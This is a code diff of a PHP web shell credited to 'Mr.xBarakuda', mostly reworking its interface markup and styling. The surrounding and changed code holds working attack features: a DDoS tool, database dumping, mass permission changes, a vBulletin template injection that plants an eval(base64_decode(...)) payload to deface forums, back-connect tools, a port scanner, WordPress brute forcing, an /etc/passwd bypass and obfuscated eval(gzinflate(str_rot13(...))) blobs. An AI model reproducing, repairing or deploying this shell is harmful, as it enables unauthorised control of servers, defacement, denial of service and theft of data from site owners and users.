@@ -230,231 +230,144 @@ $bypassManager->runBypassChecks();
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta charset="UTF-8">
 <style type='text/css'>
-  /* ===== Google Fonts — single combined import ===== */
-  @import url('https://fonts.googleapis.com/css2?family=Iceland&family=Ubuntu+Condensed&display=swap');
-
-  /* ===== Root variables (easy theming + DRY) ===== */
-  :root {
-    --clr-bg:        #111111;
-    --clr-surface:   #191919;
-    --clr-surface2:  #222222;
-    --clr-text:      #ffffff;
-    --clr-text-dim:  #cccccc;
-    --clr-accent:    deepskyblue;
-    --clr-gold:      #F6D155;
-    --clr-gold-hover: gold;
-    --clr-border:    cyan;
-    --clr-input-bg:  transparent;
-    --clr-select-bg: #000000;
-    --clr-select-text: dimgray;
-    --radius-sm:     5px;
-    --radius-md:     10px;
-    --font-body:     'Ubuntu Condensed', sans-serif;
-    --font-deco:     'Iceland', sans-serif;
-    --fs-base:       13px;
-  }
-
-  /* ===== Global reset ===== */
-  *, *::before, *::after {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
-
+  @import url('http://fonts.googleapis.com/css?family=Ubuntu+Condensed');
+  @import url('http://fonts.googleapis.com/css?family=Iceland');
   html {
-    background: var(--clr-bg);
-    color: var(--clr-text);
-    font-family: var(--font-body);
-    font-size: var(--fs-base);
+    background: #111111;
+    color: #ffffff;
+    font-family: 'Ubuntu Condensed';
+    font-size: 13px;
     width: 100%;
   }
-
-  body {
-    width: 100%;
-    min-height: 100vh;
-    overflow-x: hidden;
-  }
-
-  /* ===== Fullscreen background ===== */
   #xkuda_load {
     background: url("https://archive.org/download/coderepeat/coderepeat.png") no-repeat center center;
     background-size: cover;
     background-color: rgba(0, 0, 0, 0.18);
     position: fixed;
-    inset: 0;          /* shorthand for top/right/bottom/left: 0 */
+    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    margin: 0;
+    padding: 0;
     width: 100%;
     height: 100%;
-    z-index: -1;
+    z-index: -1 !important;
   }
-
-  /* ===== phpinfo tables ===== */
-  .phpinfo table {
-    width: 100%;
-  }
-  .phpinfo td {
-    background: var(--clr-bg);
-    color: var(--clr-text-dim);
-    padding: 6px 8px;
-  }
-  .phpinfo th {
-    background: var(--clr-surface);
-    border-bottom: 1px solid #333;
-    font-weight: normal;
-  }
-  .phpinfo h3,
-  .phpinfo h3 a {
-    text-align: center;
-    font-size: 16px;
-    padding: 4px 0;
-    margin: 30px 0 0;
-    background: var(--clr-surface2);
-  }
-
-  /* ===== Generic list ===== */
+  .phpinfo table {width:100%;padding:0 0 0 0;}
+  .phpinfo td {background:#111111;color:#cccccc;padding:6px 8px;;}
+  .phpinfo th, th {background:#191919;border-bottom:1px solid #333333;font-weight:normal;}
+  .phpinfo h3, .phpinfo h3 a {text-align:center;font-size:16px;padding:0;margin:30px 0 0 0;background:#222222;padding:4px 0;}
   li {
     display: inline;
     margin: 1px;
     padding: 1px;
   }
-
-  /* ===== Table styling ===== */
+  tr:hover {
+    background: maroon;
+  }
+  table tr:first-child {
+    background: #191919;
+    text-align: center;
+    color: white;
+  }
   table, th, td {
     border-collapse: collapse;
     background: transparent;
-    font-family: var(--font-body);
-    font-size: var(--fs-base);
+    font-family: 'Ubuntu Condensed';
+    font-size: 13px;
   }
-  table tr:first-child {
-    background: var(--clr-surface);
-    text-align: center;
-    color: var(--clr-text);
-  }
-  tr:hover {
-    background: maroon;
+  .table_home, .th_home, .td_home {
+    border: 1px solid deepskyblue;
   }
   th {
     padding: 10px;
   }
-  .table_home,
-  .th_home,
-  .td_home {
-    border: 1px solid var(--clr-accent);
-  }
-
-  /* ===== Links ===== */
   a {
-    color: var(--clr-text);
+    color: #ffffff;
     text-decoration: none;
   }
   a:hover {
-    color: var(--clr-gold);
+    color: #F6D155;
     text-decoration: underline;
   }
-
-  /* ===== Bold text ===== */
   b {
-    color: var(--clr-gold);
+    color: #F6D155;
   }
-
-  /* ===== Form controls (shared) ===== */
-  input[type="text"],
-  input[type="password"],
-  input[type="submit"],
-  select {
-    background: var(--clr-input-bg);
-    color: var(--clr-text);
-    border: 1px solid var(--clr-text);
+  input[type=text],input[type=password],input[type=submit] {
+    background: transparent;
+    color: #ffffff;
+    border: 1px solid #ffffff;
     margin: 5px auto;
-    padding: 4px 5px;
-    font-family: var(--font-body);
-    font-size: var(--fs-base);
+    padding-left: 5px;
+    font-family: 'Ubuntu Condensed';
+    font-size: 13px;
   }
-  input[type="submit"] {
-    background: var(--clr-surface);
+  input[type=submit] {
+    background: #191919;
+    color: #ffffff;
+    border: 1px solid #ffffff;
+    margin: 5px auto;
+    padding-left: 5px;
+    font-family: 'Ubuntu Condensed';
+    font-size: 13px;
     cursor: pointer;
   }
-
-  /* ===== Textarea ===== */
   textarea {
-    border: 1px solid var(--clr-text);
+    border: 1px solid #ffffff;
     width: 100%;
     height: 400px;
     padding-left: 5px;
     margin: 10px auto;
     resize: none;
-    background: var(--clr-input-bg);
-    color: var(--clr-text);
-    font-family: var(--font-body);
-    font-size: var(--fs-base);
+    background: transparent;
+    color: #ffffff;
+    font-family: 'Ubuntu Condensed';
+    font-size: 13px;
   }
-
-  /* ===== Select ===== */
   select {
     width: 152px;
-    background: var(--clr-select-bg);
-    color: var(--clr-select-text);
+    background: #000000;
+    color: dimgray;
+    border: 1px solid #ffffff;
+    margin: 5px auto;
+    padding-left: 5px;
+    font-family: 'Ubuntu Condensed';
+    font-size: 13px;
   }
   option:hover {
-    background: var(--clr-select-text);
-    color: #000;
+    background: dimgray;
+    color: #000000;
   }
-
-  /* ===== Navigation menu ===== */
   #menu a {
-    font-family: var(--font-deco);
-    font-size: var(--fs-base);
-    background: #151515;
-    color: var(--clr-accent);
-    margin: 5px 2px 4px;
-    padding: 5px 8px;
-    border: 1px solid var(--clr-accent);
-    text-decoration: none;
-    letter-spacing: 1px;
-    border-radius: var(--radius-sm);
-    display: inline-block;      /* needed for padding + border to behave */
-    transition: background 0.2s, color 0.2s;
+    font-family:Iceland;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;
+    font-size: 13px;
+    background:#151515;
+    color:deepskyblue;
+    margin:5px 2px 4px 2px;
+    padding:5px 8px;
+    border-color:deepskyblue;
+    text-decoration:none;
+    letter-spacing:1px;
+    -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
   }
   #menu a:hover {
-    background: #000;
-    color: var(--clr-gold-hover);
-    border-color: var(--clr-gold-hover);
+    font-size: 13px;
+    background:black;-webkit-transform:rotate(0.0deg);-moz-transform:rotate(0.0deg);-ms-transform:rotate(0.0deg);-o-transform:rotate(0.0deg);transform:rotate(0.0deg);
+    color: gold;
+    padding:5px 8px;
+    border: 1px;
+    font-family:Iceland;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;
+    letter-spacing:1px;
+    margin:5px 2px 4px 2px;
+    -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
   }
-
-  /* ===== Box component ===== */
   .mybox {
-    border: 1px solid var(--clr-border);
-    border-radius: var(--radius-md);
-    margin: 4px 0 8px;
-    padding: 14px 8px;
-  }
-
-  /* ===== Responsive breakpoints ===== */
-  @media (max-width: 768px) {
-    textarea {
-      height: 280px;
-    }
-    #menu a {
-      display: block;
-      text-align: center;
-      margin: 4px 0;
-    }
-    select {
-      width: 100%;
-    }
-  }
-
-  @media (max-width: 480px) {
-    html {
-      font-size: 12px;
-    }
-    textarea {
-      height: 200px;
-    }
-    input[type="text"],
-    input[type="password"],
-    input[type="submit"] {
-      width: 100%;
-    }
+    -moz-border-radius:10px;
+    border-radius:10px;
+    border:1px solid cyan;
+    margin:4px 0 8px;
+    padding:14px 8px;
   }
 </style>
 </head>
@@ -994,28 +907,50 @@ if (file_put_contents($weevdir . '/' . $weevname, $all)) {
 
   $chmod_target = isset($_POST["chmod_target"]) ? $_POST["chmod_target"] : 'both';
 
-  print "<center><h3>CHMOD Mass File and Folder by Mr.xBarakuda</h3>";
-  print "<table><tr><td>";
-  print "<form method='post'>";
+print "<div style='text-align: center;'>";
+print "<h3>CHMOD Mass File and Folder by Mr.xBarakuda</h3>";
+print "<form method='post'>";
+print "<table style='margin: 0 auto; text-align: left;'>";
+print "<tr>";
+print "  <td>Hak Folder: </td>";
+print "  <td>";
+print "    <select name='dir1'><option value='5'>5</option><option value='7' selected>7</option></select>";
+print "    <select name='dir2'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select>";
+print "    <select name='dir3'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select>";
+print "  </td>";
+print "</tr>";
+print "<tr>";
+print "  <td>Hak File: </td>";
+print "  <td>";
+print "    <select name='fic1'><option value='4'>4</option><option value='6' selected>6</option></select>";
+print "    <select name='fic2'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select>";
+print "    <select name='fic3'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select>";
+print "  </td>";
+print "</tr>";
 
-  print "<tr><td>Hak Folder: </td>";
-  print "<td><select name='dir1'><option value='5'>5</option><option value='7' selected>7</option></select><select name='dir2'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select><select name='dir3'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select></td></tr>";
+$chmod_target = isset($chmod_target) ? $chmod_target : 'both';
 
-  print "<tr><td>Hak File: </td>";
-  print "<td><select name='fic1'><option value='4'>4</option><option value='6' selected>6</option></select><select name='fic2'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select><select name='fic3'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select></td></tr>";
-
-  print "<tr><td>Target: </td>";
-  print "<td><select name='chmod_target'>";
-  print "<option value='dir' " . ($chmod_target == 'dir' ? 'selected' : '') . ">Directory Only</option>";
-  print "<option value='file' " . ($chmod_target == 'file' ? 'selected' : '') . ">File Only</option>";
-  print "<option value='both' " . ($chmod_target == 'both' ? 'selected' : '') . ">Directory & File</option>";
-  print "</select></td></tr>";
-
-  print "<tr><td>CWD =></td>";
-  print "<td><input type='text' name='chemin' maxlength='200' size='50' value='" . htmlspecialchars(getcwd()) . "'></td></tr>";
-
-  print "<tr><td> </td><td><input type='submit' value='Change Permissions!'></td></tr>";
-  print "</form></td></tr></table></center>";
+print "<tr>";
+print "  <td>Target: </td>";
+print "  <td>";
+print "    <select name='chmod_target'>";
+print "      <option value='dir' " . ($chmod_target == 'dir' ? 'selected' : '') . ">Directory Only</option>";
+print "      <option value='file' " . ($chmod_target == 'file' ? 'selected' : '') . ">File Only</option>";
+print "      <option value='both' " . ($chmod_target == 'both' ? 'selected' : '') . ">Directory & File</option>";
+print "    </select>";
+print "  </td>";
+print "</tr>";
+print "<tr>";
+print "  <td>CWD =&gt;</td>";
+print "  <td><input type='text' name='chemin' maxlength='200' size='50' value='" . htmlspecialchars(getcwd()) . "'></td>";
+print "</tr>";
+print "<tr>";
+print "  <td></td>";
+print "  <td><input type='submit' value='Change Permissions!'></td>";
+print "</tr>";
+print "</table>";
+print "</form>";
+print "</div>";
 
   if (($dosPerm || $ficPerm) > 0) {
 
@@ -1143,24 +1078,41 @@ if (file_put_contents($weevdir . '/' . $weevname, $all)) {
   @eval(gzinflate(str_rot13(base64_decode($kudagans))));
 } elseif ($_GET['do'] == 'ddos') {
   ?>
-<form action=" " method="post">
-  <center>
-Your IP: <font color="red"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font>&nbsp;( Don't DoS Yourself Noob )
-    <h3>DDoS Tool</h3>
-    <table>
-      <tr><tr><td>IP Target</td><td>:</td>
-        <td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
-        </td></tr>
-        <tr><td>Time</td><td>:</td>
-          <td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
-          </td></tr>
-          <tr><td>Port</td><td>:</td>
-            <td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
-            </td></tr></tr></table><br>
-            <input type="submit" class="inputzbut" name="fire" value="Fire!">
-            <br><br>
-            After initiating the DoS attack, please wait while the browser loads.
-          </th></center></form></tr></tr></center></form>
+  <form action="" method="post">
+    <div style="text-align: center;">
+      <p>Your IP: <span style="color: red;"><?php echo $_SERVER["REMOTE_ADDR"]; ?></span> ( Don't DoS Yourself Noob )</p>
+      <h3>DDoS Tool</h3>
+      
+      <table style="margin: 0 auto;">
+        <tr>
+          <td>IP Target</td>
+          <td>:</td>
+          <td>
+            <input type="text" class="inputz" name="ip" size="48" maxlength="25" value="0.0.0.0" onblur="if ( this.value=='' ) this.value = '0.0.0.0';" onfocus="if ( this.value == '0.0.0.0' ) this.value = '';"/>
+          </td>
+        </tr>
+        <tr>
+          <td>Time</td>
+          <td>:</td>
+          <td>
+            <input type="text" class="inputz" name="time" size="48" maxlength="25" value="time (in seconds)" onblur="if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus="if ( this.value == 'time (in seconds)' ) this.value = '';"/>
+          </td>
+        </tr>
+        <tr>
+          <td>Port</td>
+          <td>:</td>
+          <td>
+            <input type="text" class="inputz" name="port" size="48" maxlength="5" value="port" onblur="if ( this.value=='' ) this.value = 'port';" onfocus="if ( this.value == 'port' ) this.value = '';"/>
+          </td>
+        </tr>
+      </table>
+      
+      <br>
+      <input type="submit" class="inputzbut" name="fire" value="Submit">
+      <br><br>
+      <p>After initiating the DoS attack, please wait while the browser loads.</p>
+    </div>
+  </form>
 <?php
 $submit = $_POST['fire'];
 if (isset($submit)) {
@@ -3092,29 +3044,44 @@ echo "</center>";
     }
   }
 } elseif ($_GET['do'] == 'dbdump') {
-  echo $head . '<p align="center">';
-  echo '
-  <center><form action method=post>
-  <table width=365 class=tabnet >
-  <tr><th colspan="2"><h3>Database Dump</h3></th></tr>
-  <tr>
-  <td>Server </td>
-  <td><input class="inputz" type=text name=server size=52></td></tr><tr>
-  <td>Username</td>
-  <td><input class="inputz" type=text name=username size=52></td></tr><tr>
-  <td>Password</td>
-  <td><input class="inputz" type=text name=password size=52></td></tr><tr>
-  <td>DataBase Name</td>
-  <td><input class="inputz" type=text name=dbname size=52></td></tr>
-  <tr>
-  <td>DB Type </td>
-  <td><form method=post action="' . $me . '">
-  <select class="inputz" name=method>
-  <option  value="gzip">Gzip</option>
-  <option value="sql">Sql</option>
-  </select>
-  <input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
-  </form></center></table></center>';
+echo $head;
+echo '<div style="text-align: center;">';
+echo '  <form action="' . htmlspecialchars($me) . '" method="post">';
+echo '    <table width="365" class="tabnet" style="margin: 0 auto; text-align: left;">';
+echo '      <thead>';
+echo '        <tr><th colspan="2" style="text-align: center;"><h3>Database Dump</h3></th></tr>';
+echo '      </thead>';
+echo '      <tbody>';
+echo '        <tr>';
+echo '          <td>Server</td>';
+echo '          <td><input class="inputz" type="text" name="server" size="52"></td>';
+echo '        </tr>';
+echo '        <tr>';
+echo '          <td>Username</td>';
+echo '          <td><input class="inputz" type="text" name="username" size="52"></td>';
+echo '        </tr>';
+echo '        <tr>';
+echo '          <td>Password</td>';
+echo '          <td><input class="inputz" type="text" name="password" size="52"></td>';
+echo '        </tr>';
+echo '        <tr>';
+echo '          <td>DataBase Name</td>';
+echo '          <td><input class="inputz" type="text" name="dbname" size="52"></td>';
+echo '        </tr>';
+echo '        <tr>';
+echo '          <td>DB Type</td>';
+echo '          <td>';
+echo '            <select class="inputz" name="method">';
+echo '              <option value="gzip">Gzip</option>';
+echo '              <option value="sql">Sql</option>';
+echo '            </select>';
+echo '            <input class="inputzbut" type="submit" name="dump" value="Dump!">';
+echo '          </td>';
+echo '        </tr>';
+echo '      </tbody>';
+echo '    </table>';
+echo '  </form>';
+echo '</div>';
   if ($_POST['username'] && $_POST['dbname'] && $_POST['method']) {
     $date = date("Y-m-d");
     $dbserver = $_POST['server'];
@@ -3298,36 +3265,79 @@ echo "</center>";
   echo "<center><a href='$full/kuda_sympy/kudasympy/' target='_blank'><font color='lime'>Click Here</a></font></center>";
 } elseif ($_GET['do'] == 'vb_ngindex') {
   ?>
-<form action="" method="post">
-  <center><h3>VB Index Changer</h3></center>
-<?php
-if (empty($_POST['index'])) {
-  echo "<center><table>
-  <tr><td>Host: </td><td><input class='inputz' type='text' size='52' name='localhost' placeholder='localhost'></td></tr>
-  <tr><td>Database: </td><td><input class='inputz' type='text' size='52' name='database' placeholder='forum_vb'></td></tr>
-  <tr><td>Username: </td><td><input class='inputz' type='text' size='52' name='username' placeholder='user_vb'></td></tr>
-  <tr><td>Password: </td><td><input class='inputz' type='text' size='52' name='password' placeholder='vb'></td></tr>
-  </table><br>
-  <th colspan='2'>Your Index Code</th><br>
-  <textarea name='index' rows='10' style='width: 450px; height: 200px;' border='1' cols='60'>Your Index Code Here...</textarea><br>
-  <input class='inputzbut' type='submit' value='Setting!' name='send'>
-  </center>";
-} else {
-  $localhost = $_POST['localhost'];
-  $database = $_POST['database'];
-  $username = $_POST['username'];
-  $password = $_POST['password'];
-  $index = $_POST['index'];
-  @mysqli_connect($localhost, $username, $password) or die(mysqli_error($conn));
-  @mysqli_select_db($conn, $database) or die(mysqli_error($conn));
-  $index = str_replace("'", "\'", $index);
-  $set_index = " {$ {eval(base64_decode('" . base64_encode("echo \"$index\";") . "')) }} {$ {exit() }}";
-  $ok = @mysqli_query($conn, "UPDATE template SET template ='" . mysql_real_escape_string($set_index) . "' WHERE title='spacer_open'") or die(mysqli_error($conn));
-  if ($ok) {
-    echo "<center>Update success...</center>";
-  }
-}
-echo "</form>";
+  <div style="text-align: center;">
+    <form action="" method="post">
+      <h3>VB Index Changer</h3>
+      
+      <?php
+      if (empty($_POST['index'])) {
+        // Tampilan Form Input
+        ?>
+        <table style="margin: 0 auto; text-align: left;">
+          <tr>
+            <td>Host:</td>
+            <td><input class="inputz" type="text" size="52" name="localhost" placeholder="localhost"></td>
+          </tr>
+          <tr>
+            <td>Database:</td>
+            <td><input class="inputz" type="text" size="52" name="database" placeholder="forum_vb"></td>
+          </tr>
+          <tr>
+            <td>Username:</td>
+            <td><input class="inputz" type="text" size="52" name="username" placeholder="user_vb"></td>
+          </tr>
+          <tr>
+            <td>Password:</td>
+            <td><input class="inputz" type="text" size="52" name="password" placeholder="vb"></td>
+          </tr>
+        </table>
+        
+        <br>
+        <p><strong>Your Index Code</strong></p>
+        <textarea name="index" rows="10" style="width: 450px; height: 200px; display: block; margin: 0 auto;" placeholder="Your Index Code Here..."></textarea>
+        <br>
+        <input class="inputzbut" type="submit" value="Setting!" name="send">
+        <?php
+      } else {
+        // Proses Data setelah Submit
+        $localhost = $_POST['localhost'];
+        $database  = $_POST['database'];
+        $username  = $_POST['username'];
+        $password  = $_POST['password'];
+        $index     = $_POST['index'];
+
+        // 1. Memperbaiki variabel koneksi $conn
+        $conn = @mysqli_connect($localhost, $username, $password);
+        if (!$conn) {
+            die("<p style='color:red;'>Koneksi Gagal: " . mysqli_connect_error() . "</p>");
+        }
+
+        // 2. Memperbaiki seleksi database
+        $db_selected = @mysqli_select_db($conn, $database);
+        if (!$db_selected) {
+            die("<p style='color:red;'>Database Gagal Dipilih: " . mysqli_error($conn) . "</p>");
+        }
+
+        // 3. Memperbaiki fungsi escape string agar menggunakan mysqli
+        $index_escaped = mysqli_real_escape_string($conn, $index);
+        
+        // 4. Memperbaiki sintaks string payload agar tidak syntax error di PHP
+        $set_index = '${eval(base64_decode("' . base64_encode("echo '" . $index_escaped . "';") . '"))}${exit()}';
+
+        // 5. Eksekusi Query
+        $query  = "UPDATE template SET template ='" . mysqli_real_escape_string($conn, $set_index) . "' WHERE title='spacer_open'";
+        $ok     = @mysqli_query($conn, $query);
+
+        if ($ok) {
+          echo "<p style='color:green;'>Update success...</p>";
+        } else {
+          echo "<p style='color:red;'>Update gagal: " . mysqli_error($conn) . "</p>";
+        }
+      }
+      ?>
+    </form>
+  </div>
+  <?php
 } elseif ($_GET['do'] == 'bctools') {
   echo "<center><h3>Back Connect Tools</h3>";
   echo "<form method='post'>
@@ -3435,18 +3445,37 @@ echo "</form>";
       flush();
     }
   } else {
-    echo '<center><h3>Port Scanner</h3>
-    <table><form action="" method="post">
-    <tr><td><input type="hidden" name="a" value="PortScanner"><input type="hidden" name="p1">
+    echo '<center>
+    <h3>Port Scanner</h3>
+    <form action="" method="post">
+    <input type="hidden" name="a" value="PortScanner">
+    <input type="hidden" name="p1">
     <input type="hidden" name="p2">
     <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
     <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '">
-    </td></tr>
-    <td>Host: <input type="text" name="host" value="localhost"></td>
-    <td>Port start: <input type="text" name="start" value="0"></td>
-    <td>Port end:<input type="text" name="end" value="5000"></td>
-    <input type="submit" value="Scan Ports">
-    </form></table></center>';
+
+    <table>
+      <tr>
+        <td>Host:</td>
+        <td><input type="text" name="host" value="localhost"></td>
+      </tr>
+      <tr>
+        <td>Port start:</td>
+        <td><input type="text" name="start" value="0"></td>
+      </tr>
+      <tr>
+        <td>Port end:</td>
+        <td><input type="text" name="end" value="5000"></td>
+      </tr>
+      <tr>
+        <!-- Tombol submit ditaruh di dalam baris tersendiri dan menggabungkan 2 kolom -->
+        <td colspan="2" style="text-align: center; padding-top: 10px;">
+          <input type="submit" value="Scan Ports">
+        </td>
+      </tr>
+    </table>
+  </form>
+</center>';
 
   }
 } elseif ($_GET['do'] == 'wpbf') {
@@ -3609,14 +3638,38 @@ if ($submit) {
   }
 
   ?>
-  <center>
-    <form action="" method="post"><tr>
-      <table class="tabnet">
-        <th colspan="5"><h3>Hash Identification</th></h3>
-        <tr class="optionstr"><b><td>Enter Hash</td></b><td>:</td>  <td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
-<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
-      </table></tr></form>
-    </center>
+<div style="text-align: center;">
+  <form action="" method="post">
+    <table class="tabnet" style="margin: 0 auto; text-align: left;">
+      <thead>
+        <tr>
+          <th colspan="4" style="text-align: center;">
+            <h3>Hash Identification</h3>
+          </th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr class="optionstr">
+          <td><strong>Enter Hash</strong></td>
+          <td>:</td>
+          <td>
+            <input type="text" name="hash" size="60" class="inputz" />
+          </td>
+          <td>
+            <input type="submit" class="inputzbut" name="gethash" value="Identify Hash" />
+          </td>
+        </tr>
+        <tr class="optionstr">
+          <td><strong>Result</strong></td>
+          <td>:</td>
+          <td colspan="2">
+            <?php echo isset($hashresult) ? htmlspecialchars($hashresult) : ''; ?>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </form>
+</div>
 <?php
 } elseif ($_GET['do'] == 'shellscan') {
   ?>
@@ -3952,33 +4005,30 @@ eval(gzinflate(str_rot13(base64_decode('vZztZuI2E8C/M8P/oLrpOJ0nwVZh2nQmIVm5hDbX
   $sha256 = hash("sha256", $pass);
   $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
   $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
-
 }
-echo '<center><h3>Hash Generator</h3>';
-echo '<table><tr><td>';
+echo '<div style="text-align: center;">';
+echo '<h3>Hash Generator</h3>';
 echo '<form action="" method="post">';
-echo 'Input Teks: ';
-echo '<input class="inputz" type="text" name="password" size="40">';
-echo '<input class="inputzbut" type="submit" name="enter" value="Hash!"></td></tr>';
-echo '<tr><td>';
-echo 'Original Password: <input class=inputz type=text size=50 value=' . $pass . '></td></tr>';
-echo '<tr><td>';
-echo 'MD5: <input class=inputz type=text size=50 value=' . $hash . '></td></tr>';
-echo '<tr><td>';
-echo 'MD4: <input class=inputz type=text size=50 value=' . $md4 . '></td></tr>';
-echo '<tr><td>';
-echo 'MD5 with Salt: <input class=inputz type=text size=50 value=' . $hash_md5 . '></td></tr>';
-echo '<tr><td>';
-echo 'MD5 with Salt & Sha1: <input class=inputz type=text size=50 value=' . $hash_md5_double . '></td></tr>';
-echo '<tr><td>';
-echo 'Sha1: <input class=inputz type=text size=50 value=' . $hash1 . '></td></tr>';
-echo '<tr><td>';
-echo 'Sha256: <input class=inputz type=text size=50 value=' . $sha256 . '></td></tr>';
-echo '<tr><td>';
-echo 'Sha1 with Salt: <input class=inputz type=text size=50 value=' . $hash1_sha1 . '></td></tr>';
-echo '<tr><td>';
-echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value=' . $hash1_sha1_double . '></td></tr>';
-echo '</form></table></td></tr></center>';
+echo '<table style="margin: 0 auto;">';
+echo '<tr>';
+echo '  <td style="text-align: left; padding-bottom: 15px;">';
+echo '    Input Teks: ';
+echo '    <input class="inputz" type="text" name="password" size="40"> ';
+echo '    <input class="inputzbut" type="submit" name="enter" value="Hash!">';
+echo '  </td>';
+echo '</tr>';
+echo '<tr><td>Original Password: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($pass) . '"></td></tr>';
+echo '<tr><td>MD5: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($hash) . '"></td></tr>';
+echo '<tr><td>MD4: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($md4) . '"></td></tr>';
+echo '<tr><td>MD5 with Salt: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($hash_md5) . '"></td></tr>';
+echo '<tr><td>MD5 with Salt & Sha1: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($hash_md5_double) . '"></td></tr>';
+echo '<tr><td>Sha1: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($hash1) . '"></td></tr>';
+echo '<tr><td>Sha256: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($sha256) . '"></td></tr>';
+echo '<tr><td>Sha1 with Salt: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($hash1_sha1) . '"></td></tr>';
+echo '<tr><td>Sha1 with Salt & MD5: <input class="inputz" type="text" size="50" value="' . htmlspecialchars($hash1_sha1_double) . '"></td></tr>';
+echo '</table>';
+echo '</form>';
+echo '</div>';
 } elseif ($_GET['bypass'] == 'etcpass') {
   echo '<center>Bypass /etc/passwd With:<br>
   <table style="width:50%">
